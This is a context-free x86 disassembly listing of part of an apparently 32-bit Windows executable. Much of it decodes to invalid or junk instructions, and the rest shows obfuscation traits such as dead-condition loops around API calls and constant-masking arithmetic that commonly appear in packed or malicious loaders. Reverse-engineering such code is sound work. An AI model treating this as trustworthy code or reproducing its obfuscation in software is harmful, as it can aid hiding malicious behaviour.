  407ee8:	jmp    0x40801f
  407eed:	(bad)  
  407eee:	pop    edx
  407eef:	fst    st(3)
  407ef1:	jge    0x407f46
  407ef3:	out    0x5d,al
  407ef5:	jnp    0x407ee7
  407ef7:	inc    esi
  407ef8:	sub    DWORD PTR [ebp+edi*8-0x3722b944],esp
  407eff:	jl     0x407f7d
  407f01:	push   es
  407f02:	jg     0x407f80
  407f04:	jl     0x407ee0
  407f06:	(bad)  es:[edi+edx*8]
  407f0a:	or     BYTE PTR [edx-0x203af16a],0x35
  407f11:	inc    esi
  407f12:	in     eax,0xd8
  407f14:	pcmpeqw mm6,mm0
  407f17:	cmp    ebp,DWORD PTR [eax]
  407f19:	adc    esi,DWORD PTR [edi+ecx*1-0x565fcc82]
  407f20:	inc    ebx
  407f21:	mov    esi,0x89b11fb3
  407f26:	jmp    0x407f99
  407f28:	push   esp
  407f29:	or     DWORD PTR [edi+eiz*2+0x44],edx
  407f2d:	xchg   edi,eax
  407f2e:	iret   
  407f2f:	cdq    
  407f30:	stos   BYTE PTR es:[edi],al
  407f31:	or     DWORD PTR [edx-0x59],edx
  407f34:	mov    eax,0x354191c1
  407f39:	inc    edx
  407f3a:	dec    edi
  407f3b:	adc    edi,DWORD PTR [edi+0x50]
  407f3e:	add    cl,BYTE PTR [ecx]
  407f40:	pop    esp
  407f41:	jnp    0x407f6e
  407f43:	jp     0x407f81
  407f45:	in     eax,0xd1
  407f47:	sbb    DWORD PTR [esi+0x6b],edx
  407f4a:	push   eax
  407f4b:	pusha  
  407f4c:	(bad)
  407f4f:	inc    edx
  407f50:	pop    esi
  407f51:	daa    
  407f52:	xchg   ebp,eax
  407f53:	jg     0x407f6c
  407f55:	inc    DWORD PTR [eax]
  407f57:	mov    ds:0x2f6e2225,eax
  407f5c:	mov    esp,edx
  407f5e:	mov    dh,0xe4
  407f60:	xor    DWORD PTR [ebx],ecx
  407f62:	jne    0x407f42
  407f64:	mov    dh,0x69
  407f66:	mov    al,ds:0x6edf4b5a
  407f6b:	fwait
  407f6c:	jno    0x407f10
  407f6e:	pop    edx
  407f6f:	mov    ah,BYTE PTR [ecx]
  407f71:	add    ebx,esi
  407f73:	mov    ah,0xc2
  407f75:	mov    ah,0x96
  407f77:	imul   ecx,DWORD PTR [esi-0x272a0323],0xbf55375d
  407f81:	stc    
  407f82:	or     eax,0x7ad70783
  407f87:	call   DWORD PTR [esi-0x6c]
  407f8a:	mov    edi,0x5fc4d96f
  407f8f:	mov    al,0xe1
  407f91:	fistp  QWORD PTR [edi+0xa]
  407f94:	retf   
  407f95:	stc    
  407f96:	and    ebx,DWORD PTR [edi]
  407f98:	test   DWORD PTR [ecx-0x1c],edi
  407f9b:	jae    0x407fee
  407f9d:	call   0xc4b3:0xc45dfcc7
  407fa4:	push   edi
  407fa5:	test   eax,0x53534693
  407faa:	and    eax,0xe364220
  407faf:	test   DWORD PTR [esi-0x799c15dd],ebp
  407fb5:	xor    bh,BYTE PTR [eax-0x227f2e2f]
  407fbb:	ins    BYTE PTR es:[edi],dx
  407fbc:	test   ch,ch
  407fbe:	adc    DWORD PTR [edi],edx
  407fc0:	inc    eax
  407fc1:	neg    cl
  407fc3:	lods   eax,DWORD PTR ds:[esi]
  407fc4:	jmp    0x7cb77748
  407fc9:	in     eax,0x70
  407fcb:	cdq    
  407fcc:	pop    esi
  407fcd:	or     esi,DWORD PTR [ebp-0x46]
  407fd0:	mov    ecx,esi
  407fd2:	dec    ebx
  407fd3:	cmp    esi,eax
  407fd5:	sub    ebp,DWORD PTR [eax]
  407fd7:	(bad)  
  407fd9:	out    dx,al
  407fda:	sub    edx,DWORD PTR ds:0x632b93a5
  407fe0:	outs   dx,DWORD PTR ds:[esi]
  407fe1:	scas   eax,DWORD PTR es:[edi]
  407fe2:	fdivr  st,st(5)
  407fe4:	test   BYTE PTR ds:0x17ac1bec,ch
  407fea:	pop    ebp
  407feb:	add    dh,BYTE PTR [eax+0x44]
  407fee:	ds inc edx
  407ff0:	mov    ?,WORD PTR [eax]
  407ff2:	arpl   WORD PTR [esi-0x31],ax
  407ff5:	sbb    ah,BYTE PTR [edi-0x5980d08c]
  407ffb:	lods   eax,DWORD PTR ds:[esi]
  407ffc:	mov    al,0x17
  407ffe:	mov    ds:0x82bc2df6,eax
  408003:	jo     0x408053
  408005:	fs ins DWORD PTR es:[edi],dx
  408007:	inc    edi
  408008:	outs   dx,BYTE PTR ds:[esi]
  408009:	adc    DWORD PTR [ebx],edx
  40800b:	icebp  
  40800c:	cmp    DWORD PTR [eax+0x2],ebp
  40800f:	and    bl,BYTE PTR [ecx-0x60b7c5ee]
  408015:	stos   DWORD PTR es:[edi],eax
  408016:	adc    eax,0x61443978
  40801b:	loopne 0x407fad
  40801d:	repnz mov bh,0x3
  408020:	(bad)  
  408021:	mov    DWORD PTR [ebp-0x24],eax
  408024:	mov    eax,DWORD PTR [ebp-0x28]
  408027:	mov    di,WORD PTR [ebp-0x2c]
  40802b:	mov    ebx,0x8a42
  408030:	xor    di,bx
  408033:	add    di,dx
  408036:	movzx  edx,di
  408039:	mov    edi,DWORD PTR [ebp-0x8]
  40803c:	xor    edi,ecx
  40803e:	lea    edx,[edx+edi*1+0x32729e]
  408045:	add    DWORD PTR [eax],edx
  408047:	mov    eax,DWORD PTR [ebp-0x20]
  40804a:	mov    edx,DWORD PTR [ebp-0x8]
  40804d:	mov    edi,DWORD PTR [ebp-0x24]
  408050:	xor    edx,ecx
  408052:	add    edx,esi
  408054:	imul   edx,edi
  408057:	sub    DWORD PTR [eax],edx
  408059:	mov    eax,DWORD PTR [ebp-0x14]
  40805c:	jmp    0x407c08
  408061:	mov    eax,DWORD PTR [ebp-0xc]
  408064:	mov    edx,DWORD PTR [ebp-0x18]
  408067:	xor    eax,edx
  408069:	cmp    eax,0xe77c698d
  40806e:	je     0x407c05
  408074:	mov    eax,DWORD PTR [ebp-0x10]
  408077:	add    DWORD PTR [eax],0x7403501
  40807d:	jmp    0x407c05
  408082:	mov    eax,DWORD PTR [ebp-0x1c]
  408085:	cmp    DWORD PTR [eax],edi
  408087:	je     0x407c05
  40808d:	mov    eax,0x800f1c9c
  408092:	jmp    0x407c0c
  408097:	push   ebp
  408098:	mov    ebp,esp
  40809a:	push   ecx
  40809b:	xor    eax,eax
  40809d:	push   ecx
  40809e:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  4080a5:	sub    edx,0x2ef1
  4080ab:	mov    DWORD PTR [ebp-0x4],0xf89c8534
  4080b2:	xor    ecx,ecx
  4080b4:	or     ecx,DWORD PTR ds:0x44e420
  4080ba:	sbb    ecx,DWORD PTR ds:0x410753
  4080c0:	mov    DWORD PTR ds:0x44e420,ecx
  4080c6:	mov    eax,DWORD PTR [ebp-0x4]
  4080c9:	dec    DWORD PTR ds:0x410753
  4080cf:	push   esi
  4080d0:	add    DWORD PTR ds:0x44b6cc,0x9cd
  4080da:	mov    esi,DWORD PTR [ebp-0x8]
  4080dd:	xor    ecx,0x7d4d
  4080e3:	mov    edx,0x7510857
  4080e8:	xor    eax,edx
  4080ea:	adc    DWORD PTR ds:0x4248d2,0x7d5d
  4080f4:	xor    esi,edx
  4080f6:	and    DWORD PTR ds:0x44e410,0x0
  408100:	mov    ecx,DWORD PTR ds:0x44e410
  408106:	inc    ecx
  408107:	mov    DWORD PTR ds:0x44e410,ecx
  40810d:	cmp    DWORD PTR ds:0x44e410,0x1b
  408114:	jne    0x408125
  40811a:	push   0x410845
  40811f:	call   DWORD PTR ds:0x443378
  408125:	cmp    DWORD PTR ds:0x44e410,0x13
  40812c:	jb     0x408100
  408132:	mov    ecx,0x32729e
  408137:	add    esi,ecx
  408139:	jmp    0x4081e2
  40813e:	xchg   esp,eax
  40813f:	and    al,ch
  408141:	and    al,0x5d
  408143:	out    0x6d,eax
  408145:	mov    ds:0x3d17a190,al
  40814a:	sbb    DWORD PTR fs:[edx],eax
  40814d:	shl    bh,cl
  40814f:	retf   
  408150:	jl     0x4081ce
  408152:	mov    BYTE PTR [esp+edi*2+0x7c],bh
  408156:	repz sub ebp,DWORD PTR [ebx+0x3b]
  40815a:	stos   DWORD PTR es:[edi],eax
  40815b:	mov    edi,?
  40815d:	adc    cl,BYTE PTR [edi+0x76aef405]
  408163:	sub    eax,0xe6b0deca
  408168:	inc    edx
  408169:	sbb    al,0x7
  40816b:	(bad)  
  40816c:	mov    edi,0x5e695af
  408171:	stos   BYTE PTR es:[edi],al
  408172:	mov    ss,WORD PTR [esp+ecx*1-0x51]
  408176:	(bad)  
  408177:	(bad)  
  408178:	push   ecx
  408179:	test   esi,edx
  40817b:	xchg   esp,eax
  40817c:	jmp    0x5e4a:0x86819b3b
  408183:	add    al,0xda
  408185:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408186:	dec    eax
  408187:	call   0xc4b5:0x785e3956
  40818e:	fidivr WORD PTR [ecx+0xc]
  408191:	adc    eax,0x154e1bf8
  408196:	mov    gs,WORD PTR [ebp-0x70]
  408199:	sbb    BYTE PTR [edx],ah
  40819b:	push   edi
  40819c:	mov    ds:0xdc7c8a6b,al
  4081a1:	popa   
  4081a2:	cmp    DWORD PTR [ebx+0xe81f0a9],0xfcac593e
  4081ac:	jne    0x408131
  4081ae:	add    bl,ch
  4081b0:	adc    BYTE PTR [edi+0x1c17754b],ch
  4081b6:	mov    esi,0x8e4dce78
  4081bb:	sbb    ebx,eax
  4081bd:	fstp   st(4)
  4081bf:	add    BYTE PTR ds:0x1a4d4f28,dh
  4081c5:	mov    esp,0x54b24efe
  4081cb:	neg    DWORD PTR [ebx+0x254ce7ff]
  4081d1:	ror    DWORD PTR [ecx+0x13],cl
  4081d4:	mov    ds,WORD PTR [esi]
  4081d6:	(bad)  [eax]
  4081d8:	pop    ebx
  4081d9:	pop    edi
  4081da:	lods   al,BYTE PTR ds:[esi]
  4081db:	dec    ecx
  4081dc:	cli    
  4081dd:	mov    esi,eax
  4081df:	call   DWORD PTR [edi+0xfc10360]
  4081e5:	scas   eax,DWORD PTR es:[edi]
  4081e6:	(bad)  
  4081e7:	mov    esi,DWORD PTR [ebp+0xc]
  4081ea:	mov    DWORD PTR ds:0x44b6d0,0x538a
  4081f4:	cmp    esi,eax
  4081f6:	jne    0x40826b
  4081fc:	mov    DWORD PTR ds:0x44b6d4,0x1c
  408206:	cmp    DWORD PTR ds:0x44b6d4,0x0
  40820d:	je     0x408255
  408213:	cmp    DWORD PTR ds:0x44b6d4,0xe
  40821a:	jne    0x408229
  408220:	push   DWORD PTR [ebp-0x14]
  408223:	call   DWORD PTR ds:0x44301c
  408229:	cmp    DWORD PTR ds:0x44b6d4,0xf
  408230:	jne    0x408243
  408236:	mov    esi,DWORD PTR ds:0x44b6d4
  40823c:	dec    esi
  40823d:	mov    DWORD PTR ds:0x44b6d4,esi
  408243:	mov    esi,DWORD PTR ds:0x44b6d4
  408249:	dec    esi
  40824a:	mov    DWORD PTR ds:0x44b6d4,esi
  408250:	jmp    0x408206
  408255:	mov    eax,DWORD PTR [ebp-0x4]
  408258:	mov    esi,DWORD PTR [ebp-0x8]
  40825b:	xor    eax,edx
  40825d:	xor    esi,edx
  40825f:	add    eax,ecx
  408261:	add    esi,ecx
  408263:	imul   eax,esi
  408266:	jmp    0x40834f
  40826b:	mov    eax,DWORD PTR [ebp+0xc]
  40826e:	mov    eax,DWORD PTR [eax+0x78]
  408271:	mov    DWORD PTR [ebp+0xc],eax
  408274:	mov    eax,DWORD PTR [ebp-0x4]
  408277:	mov    esi,DWORD PTR [ebp-0x8]
  40827a:	xor    eax,edx
  40827c:	xor    esi,edx
  40827e:	jmp    0x408327
  408283:	mov    edi,0x6a6fd0cd
  408288:	jns    0x4082cd
  40828a:	std    
  40828b:	ficomp WORD PTR [ebx+0x10]
  40828e:	jo     0x408259
  408290:	sti    
  408291:	ja     0x408263
  408293:	jae    0x40825f
  408295:	jl     0x408313
  408297:	mov    BYTE PTR [esp+edi*2+0x7c],bh
  40829b:	add    edi,DWORD PTR [esp+ebp*1+0x67]
  40829f:	sub    BYTE PTR [edi+0x60],ch
  4082a2:	daa    
  4082a3:	inc    edx
  4082a4:	fs (bad) 
  4082a6:	popf   
  4082a7:	adc    al,0x4d
  4082a9:	sbb    al,0x9
  4082ab:	loope  0x4082cd
  4082ad:	data16 sub al,0xd9
  4082b0:	fsubr  DWORD PTR [ecx+0x6c]
  4082b3:	scas   al,BYTE PTR es:[edi]
  4082b4:	xor    ch,bh
  4082b6:	arpl   WORD PTR ds:0x96575c20,cx
  4082bc:	pop    esp
  4082bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082be:	retf   0xd026
  4082c1:	jmp    0x4082d2
  4082c3:	xchg   edi,eax
  4082c4:	push   ebp
  4082c5:	xor    al,0xde
  4082c7:	push   es
  4082c8:	nop
  4082c9:	out    0xc,eax
  4082cb:	lds    edx,FWORD PTR [eax]
  4082cd:	push   ds
  4082ce:	adc    dl,ah
  4082d0:	aas    
  4082d1:	aaa    
  4082d2:	stos   DWORD PTR es:[edi],eax
  4082d3:	shl    bl,cl
  4082d5:	mov    ebp,0xfcab0a13
  4082da:	add    BYTE PTR [ebp-0x2450fd8c],ah
  4082e0:	push   edx
  4082e1:	xor    al,0xe0
  4082e3:	fs daa 
  4082e5:	retf   0xdea6
  4082e8:	popa   
  4082e9:	imul   eax,edx,0xffffffb9
  4082ec:	ins    DWORD PTR es:[edi],dx
  4082ed:	adc    edx,0xffffff85
  4082f0:	jbe    0x40827b
  4082f2:	jg     0x408365
  4082f4:	imul   edx,DWORD PTR [eax],0xfffffff1
  4082f7:	inc    edx
  4082f8:	js     0x40832b
  4082fa:	std    
  4082fb:	mov    ch,0x60
  4082fd:	outs   dx,BYTE PTR ds:[esi]
  4082fe:	aas    
  4082ff:	retf   
  408300:	aam    0x59
  408302:	icebp  
  408303:	push   edi
  408304:	inc    ebp
  408305:	sti    
  408306:	sbb    eax,DWORD PTR [edi]
  408308:	sub    eax,0x89993e4a
  40830d:	sbb    cl,0xe5
  408310:	gs xchg edi,eax
  408312:	stos   DWORD PTR es:[edi],eax
  408313:	mov    esi,0xc9b1c7a7
  408318:	jl     0x4082ff
  40831a:	sbb    BYTE PTR [edx],dl
  40831c:	cmp    al,0xdf
  40831e:	je     0x4082d1
  408320:	sbb    al,al
  408322:	aas    
  408323:	ss fldz 
  408326:	bound  eax,QWORD PTR [ebx]
  408328:	rol    DWORD PTR [ebx],0xf1
  40832b:	imul   eax,esi
  40832e:	mov    esi,DWORD PTR [ebp+0xc]
  408331:	cmp    esi,eax
  408333:	mov    eax,DWORD PTR [ebp-0x4]
  408336:	je     0x408258
  40833c:	xor    eax,edx
  40833e:	add    eax,ecx
  408340:	mov    ecx,DWORD PTR [ebp+0xc]
  408343:	imul   eax,ecx
  408346:	add    eax,DWORD PTR [ebp+0x8]
  408349:	mov    DWORD PTR [ebp+0xc],eax
  40834c:	mov    eax,DWORD PTR [ebp+0xc]
  40834f:	pop    esi
  408350:	leave  
  408351:	ret    0x8
  408354:	push   ebp
  408355:	mov    ebp,esp
  408357:	sub    esp,0xa0
  40835d:	push   0x4452b8
  408362:	xor    DWORD PTR ds:0x44e418,0x56f9
  40836c:	call   DWORD PTR ds:0x4430a0
  408372:	adc    DWORD PTR ds:0x448980,0x4248de
  40837c:	test   eax,eax
  40837e:	mov    DWORD PTR ds:0x448984,0xdf5
  408388:	je     0x40839f
  40838e:	or     DWORD PTR ds:0x44b6e4,0x448990
  408398:	xor    eax,eax
  40839a:	jmp    0x409294
  40839f:	sub    DWORD PTR ds:0x44b6dc,0x44899c
  4083a9:	push   esi
  4083aa:	and    DWORD PTR ds:0x4248de,0x0
  4083b4:	jmp    0x4083c6
  4083b9:	mov    esi,DWORD PTR ds:0x4248de
  4083bf:	inc    esi
  4083c0:	mov    DWORD PTR ds:0x4248de,esi
  4083c6:	cmp    DWORD PTR ds:0x4248de,0x1f
  4083cd:	jae    0x408414
  4083d3:	cmp    DWORD PTR ds:0x4248de,0x9
  4083da:	jne    0x4083eb
  4083e0:	push   0x3309
  4083e5:	call   DWORD PTR ds:0x44337c
  4083eb:	cmp    DWORD PTR ds:0x4248de,0x8
  4083f2:	jne    0x408405
  4083f8:	mov    esi,DWORD PTR ds:0x4248de
  4083fe:	inc    esi
  4083ff:	mov    DWORD PTR ds:0x4248de,esi
  408405:	jmp    0x4083b9
  40840a:	or     DWORD PTR ds:0x44b6e0,0x7a7b
  408414:	mov    esi,0x876987
  408419:	mov    DWORD PTR ds:0x448990,0x1efc
  408423:	push   esi
  408424:	push   0x4452fc
  408429:	push   0x445324
  40842e:	call   DWORD PTR ds:0x443370
  408434:	mov    DWORD PTR ds:0x44e424,0x50e
  40843e:	cmp    eax,esi
  408440:	je     0x4084a1
  408446:	or     DWORD PTR ds:0x448980,0x78e6
  408450:	push   0x98786856
  408455:	add    DWORD PTR ds:0x4248d6,0x6d32
  40845f:	push   0x344
  408464:	adc    DWORD PTR ds:0x41074f,0x5b99
  40846e:	push   0x545
  408473:	adc    DWORD PTR ds:0x44899c,0x2d37
  40847d:	push   0x675765
  408482:	sbb    DWORD PTR ds:0x410743,0x4248de
  40848c:	push   0x67576
  408491:	push   0x86789768
  408496:	call   DWORD PTR ds:0x443368
  40849c:	jmp    0x409293
  4084a1:	or     edx,0x6156
  4084a7:	mov    ecx,0xf89c8535
  4084ac:	and    esi,0x7fd
  4084b2:	mov    DWORD PTR [ebp-0x20],ecx
  4084b5:	sub    esi,0x48f6
  4084bb:	mov    DWORD PTR [ebp-0x18],0xf89c8534
  4084c2:	lea    eax,[ebp-0x4c]
  4084c5:	adc    DWORD PTR ds:0x44e424,ebx
  4084cb:	mov    DWORD PTR [ebp-0x30],eax
  4084ce:	add    esi,DWORD PTR ds:0x4489a0
  4084d4:	lea    eax,[ebp-0x54]
  4084d7:	mov    DWORD PTR [ebp-0x14],eax
  4084da:	mov    DWORD PTR ds:0x4489a4,0x12
  4084e4:	cmp    DWORD PTR ds:0x4489a4,0x0
  4084eb:	je     0x40853a
  4084f1:	cmp    DWORD PTR ds:0x4489a4,0x6
  4084f8:	jne    0x408509
  4084fe:	push   0x8a27
  408503:	call   DWORD PTR ds:0x443380
  408509:	cmp    DWORD PTR ds:0x4489a4,0x7
  408510:	jne    0x408521
  408516:	mov    eax,ds:0x4489a4
  40851b:	dec    eax
  40851c:	mov    ds:0x4489a4,eax
  408521:	xor    eax,eax
  408523:	xor    eax,DWORD PTR ds:0x4489a4
  408529:	dec    eax
  40852a:	mov    ds:0x4489a4,eax
  40852f:	jmp    0x4084e4
  408534:	sbb    esi,DWORD PTR ds:0x44e418
  40853a:	mov    eax,ds:0x4451a0
  40853f:	and    DWORD PTR ds:0x44e414,0x0
  408549:	jmp    0x40855b
  40854e:	mov    esi,DWORD PTR ds:0x44e414
  408554:	inc    esi
  408555:	mov    DWORD PTR ds:0x44e414,esi
  40855b:	cmp    DWORD PTR ds:0x44e414,0x16
  408562:	jae    0x4085a2
  408568:	cmp    DWORD PTR ds:0x44e414,0x1d
  40856f:	jne    0x40858a
  408575:	push   0x61c5
  40857a:	push   0x7b2c
  40857f:	push   0x2e55
  408584:	call   DWORD PTR ds:0x443384
  40858a:	jmp    0x40854e
  40858f:	movzx  edx,WORD PTR ds:0x44b6e0
  408596:	sbb    edx,DWORD PTR ds:0x4248da
  40859c:	mov    DWORD PTR ds:0x44b6e0,edx
  4085a2:	mov    eax,DWORD PTR [eax+0x1c8]
  4085a8:	xor    edx,edx
  4085aa:	mov    eax,DWORD PTR [eax]
  4085ac:	mov    DWORD PTR ds:0x44e428,0x299a
  4085b6:	mov    edx,DWORD PTR [ebp-0x14]
  4085b9:	and    DWORD PTR ds:0x44e414,0x0
  4085c3:	xor    esi,esi
  4085c5:	add    esi,DWORD PTR ds:0x44e414
  4085cb:	inc    esi
  4085cc:	mov    DWORD PTR ds:0x44e414,esi
  4085d2:	cmp    DWORD PTR ds:0x44e414,0x27
  4085d9:	jne    0x4085f1
  4085df:	push   0x7f38
  4085e4:	push   0x1
  4085e6:	push   0x41098d
  4085eb:	call   DWORD PTR ds:0x443388
  4085f1:	cmp    DWORD PTR ds:0x44e414,0x1d
  4085f8:	jb     0x4085c3
  4085fe:	and    DWORD PTR ds:0x44b6d4,0x0
  408608:	xor    esi,esi
  40860a:	add    esi,DWORD PTR ds:0x44b6d4
  408610:	inc    esi
  408611:	mov    DWORD PTR ds:0x44b6d4,esi
  408617:	cmp    DWORD PTR ds:0x44b6d4,0xa
  40861e:	jne    0x40862f
  408624:	push   0x40b4
  408629:	call   DWORD PTR ds:0x4430ec
  40862f:	cmp    DWORD PTR ds:0x44b6d4,0x9
  408636:	jne    0x408649
  40863c:	mov    esi,DWORD PTR ds:0x44b6d4
  408642:	inc    esi
  408643:	mov    DWORD PTR ds:0x44b6d4,esi
  408649:	cmp    DWORD PTR ds:0x44b6d4,0x1b
  408650:	jb     0x408608
  408656:	or     DWORD PTR ds:0x4489a0,0x1250
  408660:	push   ebx
  408661:	movzx  esi,BYTE PTR ds:0x448990
  408668:	sub    esi,DWORD PTR ds:0x4248d6
  40866e:	mov    DWORD PTR ds:0x448990,esi
  408674:	mov    esi,0x7510857
  408679:	mov    DWORD PTR ds:0x4248d6,0x4f36
  408683:	xor    eax,esi
  408685:	sub    DWORD PTR ds:0x44e40c,0x44b6e8
  40868f:	push   edi
  408690:	mov    DWORD PTR ds:0x448990,0x1b
  40869a:	cmp    DWORD PTR ds:0x448990,0x0
  4086a1:	je     0x408750
  4086a7:	cmp    DWORD PTR ds:0x448990,0xd
  4086ae:	jne    0x4086c9
  4086b4:	push   0x7f5c
  4086b9:	push   0x1
  4086bb:	push   DWORD PTR [ebp-0x18]
  4086be:	push   0x52f7
  4086c3:	call   DWORD PTR ds:0x4430f0
  4086c9:	cmp    DWORD PTR ds:0x448990,0xe
  4086d0:	jne    0x4086e3
  4086d6:	mov    edi,DWORD PTR ds:0x448990
  4086dc:	dec    edi
  4086dd:	mov    DWORD PTR ds:0x448990,edi
  4086e3:	mov    edi,DWORD PTR ds:0x448990
  4086e9:	dec    edi
  4086ea:	mov    DWORD PTR ds:0x448990,edi
  4086f0:	jmp    0x40869a
  4086f5:	and    DWORD PTR ds:0x44e428,0x0
  4086ff:	mov    edi,DWORD PTR ds:0x44e428
  408705:	inc    edi
  408706:	mov    DWORD PTR ds:0x44e428,edi
  40870c:	cmp    DWORD PTR ds:0x44e428,0x9
  408713:	jne    0x408729
  408719:	push   0x3065
  40871e:	push   0x34da
  408723:	call   DWORD PTR ds:0x44338c
  408729:	cmp    DWORD PTR ds:0x44e428,0x8
  408730:	jne    0x408743
  408736:	mov    edi,DWORD PTR ds:0x44e428
  40873c:	inc    edi
  40873d:	mov    DWORD PTR ds:0x44e428,edi
  408743:	cmp    DWORD PTR ds:0x44e428,0x12
  40874a:	jb     0x4086ff
  408750:	mov    edi,0x32729e
  408755:	sbb    DWORD PTR ds:0x44e424,0x410753
  40875f:	add    eax,edi
  408761:	mov    DWORD PTR [edx],eax
  408763:	movzx  eax,BYTE PTR ds:0x44b6cc
  40876a:	mov    eax,ds:0x44541c
  40876f:	cmp    eax,0x23d14057
  408774:	mov    DWORD PTR ds:0x4248ce,0x37ed
  40877e:	mov    eax,DWORD PTR [ebp-0x18]
  408781:	mov    DWORD PTR ds:0x44b6e4,0x441f
  40878b:	je     0x4087a5
  408791:	neg    ecx
  408793:	mov    ecx,DWORD PTR [ebp-0x20]
  408796:	xor    eax,esi
  408798:	add    eax,edi
  40879a:	imul   eax,ecx
  40879d:	mov    DWORD PTR [ebp-0x20],eax
  4087a0:	jmp    0x40903b
  4087a5:	xor    edx,DWORD PTR ds:0x44b6cc
  4087ab:	xor    eax,esi
  4087ad:	add    eax,edi
  4087af:	and    DWORD PTR ds:0x448994,0x0
  4087b9:	mov    edx,DWORD PTR ds:0x448994
  4087bf:	inc    edx
  4087c0:	mov    DWORD PTR ds:0x448994,edx
  4087c6:	cmp    DWORD PTR ds:0x448994,0x1c
  4087cd:	jne    0x4087eb
  4087d3:	push   0x41098d
  4087d8:	push   0x5d39
  4087dd:	push   DWORD PTR [ebp-0x18]
  4087e0:	push   0x7a56
  4087e5:	call   DWORD PTR ds:0x443390
  4087eb:	cmp    DWORD PTR ds:0x448994,0x11
  4087f2:	jb     0x4087b9
  4087f8:	mov    ds:0x4452b0,eax
  4087fd:	mov    eax,DWORD PTR [ebp-0x20]
  408800:	xor    eax,esi
  408802:	inc    edx
  408803:	add    eax,edi
  408805:	movzx  edx,BYTE PTR ds:0x44b6e4
  40880c:	sub    edx,DWORD PTR ds:0x44898c
  408812:	mov    DWORD PTR ds:0x44b6e4,edx
  408818:	mov    ds:0x44541c,eax
  40881d:	mov    eax,DWORD PTR [ebp-0x18]
  408820:	or     DWORD PTR ds:0x41074b,0x6341
  40882a:	mov    edx,DWORD PTR ds:0x4452b0
  408830:	sbb    DWORD PTR ds:0x44899c,0x44b6e8
  40883a:	xor    eax,esi
  40883c:	sbb    DWORD PTR ds:0x44b6d4,0x68
  408846:	add    eax,edi
  408848:	mov    DWORD PTR ds:0x44b6e0,0x7dde
  408852:	cmp    edx,eax
  408854:	jne    0x40903b
  40885a:	mov    eax,DWORD PTR [ebp-0x18]
  40885d:	sbb    ebx,edx
  40885f:	mov    DWORD PTR [ebp-0x28],eax
  408862:	xor    eax,eax
  408864:	add    eax,DWORD PTR ds:0x4454e0
  40886a:	mov    ebx,DWORD PTR ds:0x4454ec
  408870:	sub    eax,ebx
  408872:	add    eax,DWORD PTR [eax+ebx*1]
  408875:	mov    eax,DWORD PTR [ebp-0x20]
  408878:	mov    DWORD PTR [ebp-0x1c],eax
  40887b:	mov    eax,ds:0x4451a0
  408880:	and    DWORD PTR ds:0x4489a4,0x0
  40888a:	mov    ebx,DWORD PTR ds:0x4489a4
  408890:	inc    ebx
  408891:	mov    DWORD PTR ds:0x4489a4,ebx
  408897:	cmp    DWORD PTR ds:0x4489a4,0x21
  40889e:	jne    0x4088b5
  4088a4:	push   0x32f9
  4088a9:	push   DWORD PTR [ebp-0x20]
  4088ac:	push   DWORD PTR [ebp-0x18]
  4088af:	call   DWORD PTR ds:0x4430f4
  4088b5:	cmp    DWORD PTR ds:0x4489a4,0x13
  4088bc:	jb     0x40888a
  4088c2:	mov    DWORD PTR ds:0x44b6e8,0x1c
  4088cc:	cmp    DWORD PTR ds:0x44b6e8,0x0
  4088d3:	je     0x408985
  4088d9:	cmp    DWORD PTR ds:0x44b6e8,0xe
  4088e0:	jne    0x4088ef
  4088e6:	push   DWORD PTR [ebp-0x24]
  4088e9:	call   DWORD PTR ds:0x4430f8
  4088ef:	cmp    DWORD PTR ds:0x44b6e8,0xf
  4088f6:	jne    0x40890b
  4088fc:	xor    edx,edx
  4088fe:	xor    edx,DWORD PTR ds:0x44b6e8
  408904:	dec    edx
  408905:	mov    DWORD PTR ds:0x44b6e8,edx
  40890b:	mov    edx,DWORD PTR ds:0x44b6e8
  408911:	dec    edx
  408912:	mov    DWORD PTR ds:0x44b6e8,edx
  408918:	jmp    0x4088cc
  40891d:	and    DWORD PTR ds:0x41073f,0x0
  408927:	jmp    0x40893b
  40892c:	xor    edx,edx
  40892e:	xor    edx,DWORD PTR ds:0x41073f
  408934:	inc    edx
  408935:	mov    DWORD PTR ds:0x41073f,edx
  40893b:	cmp    DWORD PTR ds:0x41073f,0x11
  408942:	jae    0x408985
  408948:	cmp    DWORD PTR ds:0x41073f,0x7
  40894f:	jne    0x40895e
  408955:	push   DWORD PTR [ebp-0xc]
  408958:	call   DWORD PTR ds:0x443394
  40895e:	cmp    DWORD PTR ds:0x41073f,0x6
  408965:	jne    0x40897a
  40896b:	xor    edx,edx
  40896d:	or     edx,DWORD PTR ds:0x41073f
  408973:	inc    edx
  408974:	mov    DWORD PTR ds:0x41073f,edx
  40897a:	jmp    0x40892c
  40897f:	xor    DWORD PTR ds:0x4489a8,ebx
  408985:	mov    eax,DWORD PTR [eax+0x198]
  40898b:	mov    DWORD PTR [ebp-0x8],eax
  40898e:	or     DWORD PTR ds:0x4489a4,0xc15
  408998:	mov    eax,DWORD PTR [ebp-0x1c]
  40899b:	mov    edx,DWORD PTR [ebp-0x8]
  40899e:	xor    ebx,0x1805
  4089a4:	xor    eax,esi
  4089a6:	dec    ebx
  4089a7:	add    eax,edi
  4089a9:	sbb    ebx,DWORD PTR ds:0x41074f
  4089af:	mov    DWORD PTR [edx],eax
  4089b1:	add    ebx,DWORD PTR ds:0x44b6d4
  4089b7:	lea    eax,[ebp-0x10]
  4089ba:	dec    ebx
  4089bb:	mov    DWORD PTR [ebp-0x34],eax
  4089be:	and    DWORD PTR ds:0x410757,0x0
  4089c8:	jmp    0x4089db
  4089cd:	xor    eax,eax
  4089cf:	or     eax,DWORD PTR ds:0x410757
  4089d5:	inc    eax
  4089d6:	mov    ds:0x410757,eax
  4089db:	cmp    DWORD PTR ds:0x410757,0x13
  4089e2:	jae    0x408a35
  4089e8:	cmp    DWORD PTR ds:0x410757,0x6
  4089ef:	jne    0x408a0d
  4089f5:	push   0x1b4e
  4089fa:	push   0x76a9
  4089ff:	push   DWORD PTR [ebp-0x1c]
  408a02:	push   0x886b
  408a07:	call   DWORD PTR ds:0x443398
  408a0d:	cmp    DWORD PTR ds:0x410757,0x5
  408a14:	jne    0x408a25
  408a1a:	mov    eax,ds:0x410757
  408a1f:	inc    eax
  408a20:	mov    ds:0x410757,eax
  408a25:	jmp    0x4089cd
  408a2a:	mov    eax,ds:0x44b6dc
  408a2f:	and    DWORD PTR ds:0x4248ce,eax
  408a35:	mov    eax,DWORD PTR [ebp-0x1c]
  408a38:	adc    edx,0x330f
